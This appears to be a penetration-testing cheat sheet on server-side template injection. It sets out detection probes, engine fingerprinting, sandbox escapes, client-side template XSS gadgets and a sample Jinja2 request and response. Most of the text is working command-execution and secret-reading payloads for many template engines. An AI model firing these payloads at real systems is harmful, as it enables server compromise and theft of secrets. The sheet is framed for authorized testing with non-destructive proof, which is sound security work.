# Server-Side Template Injection (SSTI)

**What it is:** User input embedded into a server template → template engine evaluates it → often RCE.

## Detection
- [ ] Inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}` → look for `49`.
- [ ] Confirm engine with the polyglot: `${{<%[%'"}}%\` → error fingerprints the engine.

## Engine → escalation
```
Jinja2 (Python):  {{7*7}} → {{config}} → {{''.__class__.__mro__[1].__subclasses__()}} → RCE
Twig (PHP):       {{7*7}} → {{_self.env.registerUndefinedFilterCallback("system")}}
Freemarker(Java): <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
Velocity:         #set($e="e")$e.getClass()... 
ERB (Ruby):       <%= system("id") %>
Smarty:           {system('id')}
```

## Where to look
Email/notification templates, name/profile fields rendered server-side, PDF/report generators, error pages, CMS custom fields, subject lines.

## Impact
RCE, file read, SSRF, config/secret disclosure.

## Tools
`tplmap`, `SSTImap`, manual polyglot.

## 🎯 PoC — Request → Response

**Injection in a name that renders into a server-side email template (Jinja2):**
```http
POST /api/v2/invites HTTP/2
Host: api.target.com
Authorization: Bearer <mine>
Content-Type: application/json

{"invitee_name":"{{7*7}}","email":"me@evil.com"}
```
```http
HTTP/2 200 OK
{"preview":"Hi 49, you've been invited"}      ← 49 = template evaluated
```
Escalate to RCE proof (benign):
```http
{"invitee_name":"{{cycler.__init__.__globals__.os.popen('id').read()}}"}
```
```http
HTTP/2 200 OK
{"preview":"Hi uid=33(www-data) gid=33(www-data) groups=33(www-data)\n, ..."}
```

## More engines → escalation
```
Handlebars(Node): {{#with "s" as |x|}}{{#each (lookup x.constructor "constructor")}}...  → RCE
Pug/Jade(Node):   #{root.process.mainModule.require('child_process').execSync('id')}
Nunjucks(Node):   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
Mako(Python):     ${__import__('os').popen('id').read()}
Tornado(Python):  {%import os%}{{os.popen('id').read()}}
Thymeleaf(Java):  [[${T(java.lang.Runtime).getRuntime().exec('id')}]]  / __${...}__::.x
Spring SpEL:      ${T(java.lang.Runtime).getRuntime().exec('id')}   (also OGNL in Struts)
Razor(.NET):      @{ System.Diagnostics.Process.Start("cmd","/c calc"); }
Go text/template: {{.}} leaks struct; html/template auto-escapes (XSS-safe) — text/template ≠ safe
Django:           sandboxed — hunt {% debug %}, {% load %}, SSRF via {% include %}, or reach settings
```

## Deep cuts — detect, escape sandboxes, chain
- [ ] **Blind SSTI (no reflection):** use math in a field that lands in a server-rendered email/PDF/invoice/subject you receive later; or time/error oracle (`{{7*'7'}}` type-error differs by engine).
- [ ] **Engine fingerprint decision tree:** `{{7*7}}`→49 and `{{7*'7'}}`→`7777777` = Jinja/Twig; `${7*7}`→49 = Freemarker/JSP-EL/Thymeleaf/Mako; `#{7*7}` = Ruby/Thymeleaf; `<%=7*7%>` = ERB/JSP. Then send the polyglot `${{<%[%'"}}%\` and read the error.
- [ ] **Sandbox escapes:** Jinja2 sandbox → `cycler`/`joiner`/`namespace.__init__.__globals__`, `lipsum.__globals__`, `get_flashed_messages.__globals__`; Twig sandbox → `_self.env` filter-callback; SnakeYAML/Freemarker restricted → find an allowed class that shells out.
- [ ] **Client-Side Template Injection (CSTI):** AngularJS `{{constructor.constructor('alert(1)')()}}`, Vue `{{_c.constructor('alert(1)')()}}` → XSS even under CSP (sandbox-escape gadgets per version). This is XSS-class impact, not RCE — route to `03-injection/02`.
- [ ] **SSTI hiding as XSS:** if `{{7*7}}` reflects as `49` in HTML, confirm server-side (RCE) vs client-side (CSTI/XSS) before you pick the payload.
- [ ] **Read secrets even without RCE:** `{{config}}` (Flask), `{{settings}}`, environment/globals dumps → DB creds, secret keys (→ forge sessions/JWT).

## Report notes
Prove with a non-destructive command output (`id`, template config dump). Do not touch data or persist. State the engine and whether impact is RCE (server) or XSS (client/CSTI).
